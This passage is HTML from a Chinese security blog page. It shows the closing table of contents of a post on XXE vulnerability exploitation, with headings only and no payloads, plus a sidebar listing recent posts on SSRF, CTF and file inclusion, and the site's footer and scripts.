<span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E6%96%87%E6%A1%A3"><span class="toc-number">1.3.</span> <span class="toc-text">XML文档</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD"><span class="toc-number">1.4.</span> <span class="toc-text">DTD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.5.</span> <span class="toc-text">XXE漏洞的危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">XXE漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.1.</span> <span class="toc-text">文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-number">2.1.1.</span> <span class="toc-text">有回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">2.1.2.</span> <span class="toc-text">无回显</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.2.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.3.</span> <span class="toc-text">内网探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dos%E6%94%BB%E5%87%BB"><span class="toc-number">2.4.</span> <span class="toc-text">Dos攻击</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/1355767420.html" title="SSRF漏洞">SSRF漏洞</a><time datetime="2024-06-17T11:33:30.000Z" title="发表于 2024-06-17 19:33:30">2024-06-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/4120014032.html" title="XXE漏洞利用">XXE漏洞利用</a><time datetime="2024-06-16T03:45:10.000Z" title="发表于 2024-06-16 11:45:10">2024-06-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/2308381537.html" title="CTF_RCE">CTF_RCE</a><time datetime="2024-05-20T15:15:44.000Z" title="发表于 2024-05-20 23:15:44">2024-05-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/773187307.html" title="CTF-web-wp">CTF-web-wp</a><time datetime="2024-05-14T16:18:51.000Z" title="发表于 2024-05-15 00:18:51">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/1082777166.html" title="文件包含漏洞">文件包含漏洞</a><time datetime="2024-05-07T11:54:05.000Z" title="发表于 2024-05-07 19:54:05">2024-05-07</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/background.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 仙人掌门</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
